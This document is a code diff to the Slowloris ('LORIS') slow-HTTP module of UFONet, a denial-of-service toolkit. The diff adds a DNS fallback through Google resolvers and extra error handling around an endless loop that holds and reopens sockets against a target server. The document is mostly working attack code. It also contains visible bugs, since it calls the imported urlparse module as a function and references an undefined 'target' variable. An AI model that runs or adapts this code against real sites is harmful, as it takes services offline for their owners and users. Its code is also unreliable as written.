@@ -7,7 +7,7 @@ You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import socket, random, ssl, re
+import socket, random, ssl, re, urlparse
 
 # UFONet Slow HTTP requests (LORIS)
 def setupSocket(self, ip):
@@ -37,32 +37,47 @@ def setupSocket(self, ip):
         if "Location:" in l:
             try:
                 ip = re.findall('https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', l)[0] # extract new redirect url
-                ip = socket.gethostbyname(ip)
+                try:
+                    ip = socket.gethostbyname(ip)
+                except:
+                   try:
+                       import dns.resolver
+                       r = dns.resolver.Resolver()
+                       r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
+                       url = urlparse(ip)
+                       a = r.query(url.netloc, "A") # A record
+                       for rd in a:
+                           ip = str(rd)
+                   except:
+                       ip = target
             except:
                 pass
     return sock, ip
 
 def tractor(self, ip, requests): 
     n=0
-    for i in range(requests): 
-        n=n+1
-        try:
-            sock, ip = setupSocket(self, ip)
-            print "[Info] LORIS: Firing 'tractor beam' ["+str(n)+"] -> Status: CONNECTED! (Keeping socket open in time...)"
-        except:
-            print "[Error] LORIS: Failed to engage with 'tractor beam' ["+str(n)+"]"
-        self.sockets.append(sock)
-    while True: # try to abuse HTTP Headers
-        for sock in list(self.sockets):
-            try: 
+    try:
+        for i in range(requests): 
+            n=n+1
+            try:
                 sock, ip = setupSocket(self, ip)
-            except socket.error:
-                self.sockets.remove(sock)
-        for i in range(requests - len(self.sockets)):
-            print("[Info] LORIS: Re-opening closed 'tractor beam' -> Status: RE-LINKED!")
-            sock, ip = setupSocket(self, ip)
-            if sock:
-                self.sockets.append(sock)
+                print "[Info] [AI] [LORIS] Firing 'tractor beam' ["+str(n)+"] -> [CONNECTED!]"
+            except:
+                print "[Error] [AI] [LORIS] Failed to engage with 'tractor beam' ["+str(n)+"]"
+            self.sockets.append(sock)
+        while True: # try to abuse HTTP Headers
+            for sock in list(self.sockets):
+                try: 
+                    sock, ip = setupSocket(self, ip)
+                except socket.error:
+                    self.sockets.remove(sock)
+            for i in range(requests - len(self.sockets)):
+                print("[Info] [AI] [LORIS] Re-opening closed 'tractor beam' -> [RE-LINKED!]")
+                sock, ip = setupSocket(self, ip)
+                if sock:
+                    self.sockets.append(sock)
+    except:
+        print("[Error] [AI] [LORIS] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class LORIS(object):
     def __init__(self):
@@ -77,9 +92,18 @@ class LORIS(object):
         self.methods = ['GET', 'POST', 'X-METHOD'] # supported HTTP requests methods
 
     def attacking(self, target, requests):
-        print "\n[Info] Slow HTTP requests (LORIS) is ready to fire: [" , requests, "tractor beams ]\n"
+        print "[Info] [AI] Slow HTTP requests (LORIS) is ready to fire: [" , requests, "tractor beams ]"
         try:
             ip = socket.gethostbyname(target)
         except:
-            ip = target
+            try:
+                import dns.resolver
+                r = dns.resolver.Resolver()
+                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
+                url = urlparse(target)
+                a = r.query(url.netloc, "A") # A record
+                for rd in a:
+                    ip = str(rd)
+            except:
+                ip = target
         tractor(self, ip, requests) # attack with LORIS using threading
